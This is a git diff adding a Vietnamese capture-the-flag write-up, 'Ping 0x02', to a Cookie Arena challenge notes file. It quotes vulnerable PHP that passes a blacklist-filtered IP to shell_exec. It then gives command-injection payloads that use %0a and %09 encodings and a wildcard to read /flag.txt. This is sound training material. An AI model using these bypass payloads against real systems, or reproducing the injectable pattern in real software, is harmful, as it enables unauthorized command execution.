@@ -26,6 +26,7 @@
 - [SQL Truncation Attack](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#sql-truncation-attack)
 - [Leaked OTP](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#leaked-otp)
 - [Unzip me now](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#unzip-me-now)
+- [Ping 0x02]()
 ### HTTP Request Content-Length
 Challenge:
 
@@ -716,8 +717,48 @@ Upload file `flag.zip` lên website, truy cập vào trong folder:
 Khi click vào `flag` thì file flag sẽ được tải về, xem nội dung file và tôi có được flag:
 
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image137.png?raw=true)
+### Ping 0x02
 
+![img](138)
 
+Trang web cho phép nhập IP và khi click Ping thì sẽ tạo lệnh ping đến địa chỉ IP này. 
+
+Trong đoạn code mà thử thách cung cấp, tôi tìm được bộ lọc:
+
+    if(isset($_POST[ 'ip' ])) {
+        $target = urldecode(trim($_POST[ 'ip' ]));
+        $substitutions = array(
+            '&'  => '',
+            ';'  => '',
+            '|' => '',
+            '-'  => '',
+            '$'  => '',
+            '('  => '',
+            ')'  => '',
+            '`'  => '',
+            '||' => '',
+            ' ' => '',
+            'flag' => '',
+            "*" => ''
+        );
+        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+        $cmd = shell_exec( 'ping -c 4 ' . $target );
+    }
+
+Ý tưởng của tôi là sẽ nhập payload:
+
+    127.0.0.1;cat /flag.txt
+
+Để bypass, tôi sẽ thay đổi payload thành:
+
+    127.0.0.1%0acat%09/fla?.txt
+
+- `%0a` đại diện cho việc xuống dòng, sẽ thay thế cho `;` vì đôi khi việc xuống dòng cũng có thể nối lệnh
+- `%09` sẽ thay thế cho `' '`
+
+Sau khi chèn payload này tôi có được flag:
+
+![img](139)
 
 
 
